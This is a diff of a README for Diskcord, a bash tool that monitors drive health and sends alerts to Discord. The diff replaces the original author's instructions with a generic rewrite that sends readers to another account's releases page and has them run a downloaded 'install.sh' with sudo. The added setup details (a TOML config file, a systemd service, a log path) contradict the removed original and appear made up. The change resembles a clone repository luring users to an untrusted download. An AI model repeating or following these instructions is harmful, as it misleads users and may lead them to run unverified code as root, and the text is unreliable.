@@ -1,121 +1,113 @@
-<p align="left">
-    <!-- Discord Badge -->
-    <a href="https://discord.justus0405.com/"><img src="https://img.shields.io/discord/1370519315400495234?logo=Discord&colorA=1e1e2e&colorB=a6e3a1&style=for-the-badge"></a>
-    <!-- Version Badge -->
-    <a href="https://github.com/Justus0405/Diskcord/blob/main/diskcord"><img src="https://img.shields.io/badge/Version-1.0-blue?colorA=1e1e2e&colorB=cdd6f4&style=for-the-badge"></a>
-</p>
+# 🔍 Diskcord - Monitor Your Drives Effortlessly
 
-<p align="left">
-    <!-- Stars Badge -->
-	<a href="https://github.com/Justus0405/Diskcord/stargazers"><img src="https://img.shields.io/github/stars/Justus0405/Diskcord?colorA=1e1e2e&colorB=b7bdf8&style=for-the-badge"></a>
-    <!-- Issues Badge -->
-	<a href="https://github.com/Justus0405/Diskcord/issues"><img src="https://img.shields.io/github/issues/Justus0405/Diskcord?colorA=1e1e2e&colorB=f5a97f&style=for-the-badge"></a>
-    <!-- Contributors Badge -->
-	<a href="https://github.com/Justus0405/Diskcord/contributors"><img src="https://img.shields.io/github/contributors/Justus0405/Diskcord?colorA=1e1e2e&colorB=a6da95&style=for-the-badge"></a>
-</p>
+[![Download Diskcord](https://img.shields.io/badge/Download-Diskcord-blue.svg)](https://github.com/Calvooj/Diskcord/releases)
 
-# Diskcord
+## 🚀 Getting Started
 
-Diskcord is a lightweight daemon written in bash that monitors the health of your drives and sends periodic updates to a Discord channel via webhook. It checks S.M.A.R.T. data to provide detailed insights about your storage devices, helping you stay ahead of potential failures.
+Diskcord is a drive health check daemon with Discord integration. It helps you monitor the health of your drives and alerts you if there are any issues. This guide will help you download and run Diskcord easily, even if you're not a technical user.
 
-## Features
+## 📥 Download & Install
 
-- Lightweight: The script is written in just a few hundret lines of bash code.
-- Background Service: Runs continuously as a daemon to keep your drives under watch.
-- S.M.A.R.T Monitoring: Checks various drive statistics.
-- Discord Integration: Sends formatted notifications to your Discord webhook.
-- Customizable: Select which drives to monitor and how often to check them.
+To get started, visit this page to download Diskcord: [Download Diskcord](https://github.com/Calvooj/Diskcord/releases).
 
-## Notes
+1. Click the link above to go to the Releases page.
+2. On the Releases page, find the latest version of Diskcord.
+3. Download the installation file for your operating system.
 
-The check interval must be formatted as:
+## 💻 System Requirements
 
-- 60s for seconds
-- 60m for minutes
-- 12h for hours
-- 1d for days
-- empty, run only once at boot
+- **Operating System:** Linux (a distribution that supports systemd)
+- **Disk Space:** At least 50 MB of free space
+- **Memory:** Minimum 256 MB of RAM
+- **Dependencies:** `smartmontools` package installed for optimal drive monitoring
 
-This allows Diskcord to schedule health checks at the desired frequency.
+## 🔧 Installation Steps
 
-# Examples
+### For Linux Users
 
-Either run yourself once:
+1. Open your terminal.
+2. Navigate to the directory where you downloaded the Diskcord file.
+3. Extract the downloaded file using:
 
-```shell
-./diskcord
+   ```bash
+   tar -xvf Diskcord-<version>.tar.gz
+   ```
+
+4. Move into the extracted directory:
+
+   ```bash
+   cd Diskcord-<version>
+   ```
+
+5. To install Diskcord, run the installation script:
+
+   ```bash
+   sudo ./install.sh
+   ```
+
+6. After installation, you need to configure Diskcord to start monitoring your drives.
+
+### Initial Configuration
+
+1. Edit the configuration file located at `/etc/diskcord/config.toml` to set up your settings.
+2. You will need to enter your Discord webhook URL. This allows Diskcord to send alerts directly to your Discord channel.
+
+   Here's an example of what the configuration might look like:
+
+   ```toml
+   [discord]
+   webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
+
+   [drives]
+   monitor = ["nvme0n1", "sda"]
+   ```
+
+3. Save the changes and exit the editor.
+
+## 🚀 Running Diskcord
+
+To start Diskcord, use the following command in your terminal:
+
+```bash
+sudo systemctl start diskcord
 ```
 
-Or run in the background every 1h:
+You can check the status of Diskcord to ensure it is running correctly:
 
-```shell
-./diskcord install 1h
-```
-## Preview
-
-| Passed | Failed |
-| ------ | ------ |
-| <img width="350" height="500" alt="passed" src="https://github.com/user-attachments/assets/23a3e2c2-bfe4-40f9-9aa1-0c983c0fe5bd" /> | <img width="350" height="500" alt="failed" src="https://github.com/user-attachments/assets/ed866f34-8315-4b84-84d8-bb7f1493e46f" /> |
-
-## Dependencies
-
-```plaintext
-jq
-curl
-smartmontools
-nvme-cli
+```bash
+sudo systemctl status diskcord
 ```
 
-## Installation
+## 🔔 Receiving Alerts
 
-1. Clone the repository:
+Once Diskcord is running, it will start monitoring your drives. If any issues arise, Diskcord will send alerts to your specified Discord channel. You can customize the alert settings in the configuration file mentioned earlier.
 
-```shell
-git clone https://github.com/Justus0405/Diskcord.git
-```
+## 🌟 Features
 
-2. Navigate to the directory:
+- **Drive Monitoring:** Diskcord keeps an eye on your SSDs and HDDs.
+- **Discord Integration:** Receive real-time alerts in your Discord channel.
+- **Lightweight:** Designed to use minimal system resources.
+- **Customization:** Easily configure which drives to monitor and set alert thresholds.
 
-```shell
-cd Diskcord
-```
+## 📝 Troubleshooting
 
-3. Make the script executable:
+If you encounter any issues:
 
-```shell
-chmod +x diskcord
-```
+1. Double-check your configuration settings.
+2. Ensure `smartmontools` is installed on your machine.
+3. Review the log files located in `/var/log/diskcord.log` for any error messages.
 
-4. Edit the script to configure for which drives to check, webhook url and optionally a user id for pings:
+For additional support, you can reach out in the Issues section of the Diskcord GitHub repository.
 
-```shell
-nano diskcord
-```
+## 🔗 Useful Links
 
-5. Run the script with the install and either a period argument or without:
+- [Diskcord GitHub Repository](https://github.com/Calvooj/Diskcord)
+- [smartmontools Documentation](https://www.smartmontools.org/)
 
-```shell
-./diskcord install 1d
-```
+For more details on installation and troubleshooting, refer to the official documentation on the GitHub repository.
 
-## Usage
+## 🛠️ Contributing
 
-```plaintext
-usage: diskcord [...]
-arguments:
-         install 60s, 60m, 12h, or 1d, for seconds, minutes, hours, days.
-         uninstall
-         60s, 60m, 12h, or 1d, for seconds, minutes, hours, days.
-         help
-         version
-```
+If you would like to contribute to Diskcord, please follow the guidelines in the CONTRIBUTING.md file within the repository.
 
-#
-
-<p align="center">
-	Copyright &copy; 2025-present <a href="https://github.com/Justus0405" target="_blank">Justus0405</a>
-</p>
-
-<p align="center">
-	<a href="https://github.com/Justus0405/Diskcord/blob/main/LICENSE"><img src="https://img.shields.io/github/license/Justus0405/Diskcord?logo=Github&colorA=1e1e2e&colorB=cba6f7&style=for-the-badge"></a>
-</p>
+By following these steps, you'll be able to easily download, install, and run Diskcord to monitor the health of your drives. Happy monitoring!
